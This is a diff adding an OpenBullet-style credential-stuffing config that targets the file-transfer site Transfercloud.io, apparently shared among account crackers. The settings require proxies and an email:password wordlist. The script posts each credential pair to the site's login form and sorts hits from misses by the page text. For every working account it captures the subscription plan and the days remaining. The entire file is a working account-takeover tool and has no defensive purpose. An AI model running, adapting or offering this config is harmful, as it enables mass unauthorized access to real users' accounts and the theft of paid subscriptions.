@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "Transfercloud.io",
+  "SuggestedBots": 1,
+  "LastModified": "2019-07-07T01:38:55.3956067+10:00",
+  "AdditionalInfo": "",
+  "Author": "MafiaOG#9955",
+  "Version": "1.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://transfercloud.io" 
+  CONTENT "username=<USER>&password=<PASS>&login=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://transfercloud.io" 
+  HEADER "Referer: https://transfercloud.io/?" 
+
+#KEYS KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Active Transfers" 
+  KEYCHAIN Failure OR 
+    KEY "\"Unknown username or password\"" 
+
+REQUEST GET "https://transfercloud.io/profile.pl" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "id=\"accountType\">" "</span>" -> CAP "Plan" 
+
+PARSE "<SOURCE>" LR "<span id=\"daysleft\">" "</span>" -> CAP "Expired" 
+
